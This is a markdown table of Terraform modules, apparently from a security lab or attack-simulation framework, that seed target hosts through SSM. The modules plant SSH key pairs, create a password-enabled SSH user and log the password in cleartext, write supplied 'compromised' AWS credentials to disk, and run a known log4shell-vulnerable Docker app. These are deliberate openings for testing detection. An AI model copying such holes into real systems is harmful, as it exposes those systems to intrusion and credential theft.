| ModuleName                                                                 | Source                                                         | Tag                                        | ConfigPath                                                                | ConfigOptionsDefault                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | PayloadPath                                                                                                                    | Payload                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
|:---------------------------------------------------------------------------|:---------------------------------------------------------------|:-------------------------------------------|:--------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| target-ssh-keys                                                            | ./modules/ssm/deploy-ssh-keys                                  | ssm_deploy_secret_ssh_public               | context.aws.ssm.ssh_keys                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_keys": {<br/>                    "enabled": false,<br/>                    "ssh_authorized_keys_path": "/home/sshuser/.ssh/authorized_keys",<br/>                    "ssh_private_key_path": "/home/sshuser/.ssh/secret_key",<br/>                    "ssh_public_key_path": "/home/sshuser/.ssh/secret_key.pub"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-keys                                  | <pre>\# ssh key<br/>resource &quot;tls\_private\_key&quot; &quot;ssh&quot; \{<br/>  algorithm = &quot;RSA&quot;<br/>  rsa\_bits  = &quot;4096&quot;<br/>\}<br/><br/>locals \{<br/>    ssh\_private\_key = base64encode\(tls\_private\_key\.ssh\.private\_key\_pem\)<br/>    ssh\_private\_key\_path = var\.inputs\[&quot;ssh\_private\_key\_path&quot;\]<br/>    ssh\_public\_key = base64encode\(chomp\(tls\_private\_key\.ssh\.public\_key\_openssh\)\)<br/>    ssh\_public\_key\_path = var\.inputs\[&quot;ssh\_public\_key\_path&quot;\]<br/>    ssh\_authorized\_keys\_path = var\.inputs\[&quot;ssh\_authorized\_keys\_path&quot;\]<br/>    public\_key\_user = split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_public\_key\_path\)\[2\]<br/>    private\_key\_user = split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[1\] == &quot;root&quot; ? &quot;root&quot; : split\(&quot;/&quot;, local\.ssh\_private\_key\_path\)\[2\]<br/><br/>    payload\_public = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating public key: $\{local\.ssh\_public\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.public\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.public\_key\_user\}&quot; \|\| log &quot;$\{local\.public\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{dirname\(local\.ssh\_public\_key\_path\)\}<br/>    echo &\#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&\#x27; &gt; $\{local\.ssh\_public\_key\_path\}<br/>    echo &\#x27;$\{base64decode\(local\.ssh\_public\_key\)\}&\#x27; &gt;&gt; $\{local\.ssh\_authorized\_keys\_path\}<br/>    sort $\{local\.ssh\_authorized\_keys\_path\} \| uniq &gt; $\{local\.ssh\_authorized\_keys\_path\}\.uniq<br/>    mv $\{local\.ssh\_authorized\_keys\_path\}\.uniq $\{local\.ssh\_authorized\_keys\_path\}<br/>    chmod 600 $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    chown \-R $\{local\.public\_key\_user\}:$\{local\.public\_key\_user\} $\{local\.ssh\_public\_key\_path\} $\{local\.ssh\_authorized\_keys\_path\}<br/>    log &quot;public key: $\(ls \-l $\{local\.ssh\_public\_key\_path\}\)&quot;<br/>    log &quot;authorized key: $\(ls \-l $\{local\.ssh\_authorized\_keys\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_public = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;public\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_public<br/>    \}\}\)<br/><br/>    payload\_private = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;creating private key: $\{local\.ssh\_private\_key\_path\}&quot;<br/>    log &quot;adding user: $\{local\.private\_key\_user\}\.\.\.&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;$\{local\.private\_key\_user\}&quot; \|\| log &quot;$\{local\.private\_key\_user\} user already exists&quot;<br/>    mkdir \-p $\{dirname\(local\.ssh\_private\_key\_path\)\}<br/>    echo &\#x27;$\{base64decode\(local\.ssh\_private\_key\)\}&\#x27; &gt; $\{local\.ssh\_private\_key\_path\}<br/>    chmod 600 $\{local\.ssh\_private\_key\_path\}<br/>    chown $\{local\.private\_key\_user\}:$\{local\.private\_key\_user\} $\{local\.ssh\_private\_key\_path\}<br/>    log &quot;private key: $\(ls \-l $\{local\.ssh\_private\_key\_path\}\)&quot;<br/>    log &quot;done&quot;<br/>    EOT<br/>    base64\_payload\_private = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;private\_tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload\_private<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload\_public = base64gzip\(local\.base64\_payload\_public\)<br/>        base64\_uncompressed\_payload\_public = base64encode\(local\.base64\_payload\_public\)<br/>        base64\_payload\_private = base64gzip\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_private = base64encode\(local\.base64\_payload\_private\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-deploy-ssh-user                                                     | ./modules/ssm/deploy-ssh-user                                  | ssm_deploy_ssh_user                        | context.aws.ssm.ssh_user                                                  | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "ssh_user": {<br/>                    "enabled": false,<br/>                    "password": null,<br/>                    "username": "lou.caloozer"<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-ssh-user                                  | <pre>locals \{<br/>    password = try\(length\(var\.inputs\[&quot;password&quot;\]\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;password&quot;\] :  random\_password\.password\.result<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;starting script&quot;<br/>    log &quot;Setting up user: $\{var\.inputs\[&quot;username&quot;\]\}&quot;<br/>    adduser \-\-gecos &quot;&quot; \-\-disabled\-password $\{var\.inputs\[&quot;username&quot;\]\} \|\| log &quot;$\{var\.inputs\[&quot;username&quot;\]\} user already exists&quot;<br/>    log &quot;Setting passwd: $\{local\.password\}&quot;<br/>    echo &\#x27;$\{var\.inputs\[&quot;username&quot;\]\}:$\{local\.password\}&\#x27; \| chpasswd<br/>    log &quot;Adding user to allowed passwd auth in sshd\_config\.d&quot;<br/>    cat &gt; /etc/ssh/sshd\_config\.d/common\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    \# Configuration to allow key authentication only and display a message on password attempt<br/>    Match User root,admin,test,guest,info,adm,mysql,user,administrator,oracle,ftp,pi,puppet,ansible,ec2\-user,vagrant<br/>        AuthenticationMethods publickey<br/>        PasswordAuthentication no<br/>        ForceCommand /bin/echo &\#x27;We talked about this guys\. No SSH for you\!&\#x27;<br/>    EOF<br/>    cat &gt; /etc/ssh/sshd\_config\.d/custom\-user\-passwd\-auth\.conf &lt;&lt;\-EOF <br/>    Match User $\{var\.inputs\[&quot;username&quot;\]\}<br/>        AuthenticationMethods publickey password<br/>        PasswordAuthentication yes<br/>    EOF<br/>    log &quot;Restarting ssh service&quot;<br/>    service ssh reload<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>        password = local\.password<br/>    \}<br/>\}<br/><br/>resource &quot;random\_password&quot; &quot;password&quot; \{<br/>  length           = 16<br/>  special          = true<br/>  override\_special = &quot;\!\#$%&amp;\*\(\)\-\_=\+\[\]\{\}&lt;&gt;:?&quot;<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-aws-credentials                                                     | ./modules/ssm/deploy-aws-credentials                           | ssm_deploy_secret_aws_credentials          | context.aws.ssm.aws_credentials                                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "aws_credentials": {<br/>                    "compromised_keys_user": null,<br/>                    "enabled": false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-aws-credentials                           | <pre>locals \{<br/>    tool = &quot;aws&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;$\{k\.rendered\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;Setting up aws cred environment variables\.\.\.&quot;<br/>    $\{local\.aws\_creds\}<br/>    log &quot;Deploying aws credentials\.\.\.&quot;<br/>    mkdir \-p ~/\.aws<br/>    cat &lt;&lt;\-EOF &gt; ~/\.aws/credentials<br/>    \[default\]<br/>    aws\_access\_key\_id=$AWS\_ACCESS\_KEY\_ID<br/>    aws\_secret\_access\_key=$AWS\_SECRET\_ACCESS\_KEY<br/>    EOF<br/>    cat &lt;&lt;\-EOF &gt; ~/\.aws/config<br/>    \[default\]<br/>    region=$AWS\_DEFAULT\_REGION<br/>    output=json<br/>    EOF<br/>    log &quot;Running: aws get\-caller\-identity&quot;<br/>    aws sts get\-caller\-identity \-\-output json &gt;&gt; $LOGFILE 2&gt;&amp;1 <br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &amp;&gt;/dev/null; do<br/>            log &quot;$\{local\.tool\} not found \- waiting&quot;;<br/>            sleep 120 <br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-vulnerable-docker-log4j-app                                         | ./modules/ssm/deploy-docker-log4j-app                          | ssm_deploy_docker_log4j_app                | context.aws.ssm.vulnerable.docker.log4j_app                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "docker": {<br/>                        "log4j_app": {<br/>                            "enabled": false,<br/>                            "listen_port": 8000<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker-log4j-app                          | <pre>locals \{<br/>    image = &quot;ghcr\.io/christophetd/log4shell\-vulnerable\-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929&quot;<br/>    name = &quot;log4shell&quot;<br/>    listen\_port=var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.name\}\` \]\]; then docker stop $\{local\.name\}; fi<br/>        log &quot;$\(echo &\#x27;docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\}&\#x27;\)&quot;<br/>        docker run \-d \-\-name $\{local\.name\} \-v /tmp:/tmp \-\-rm \-p $\{local\.listen\_port\}:8080 $\{local\.image\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        docker ps \-a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             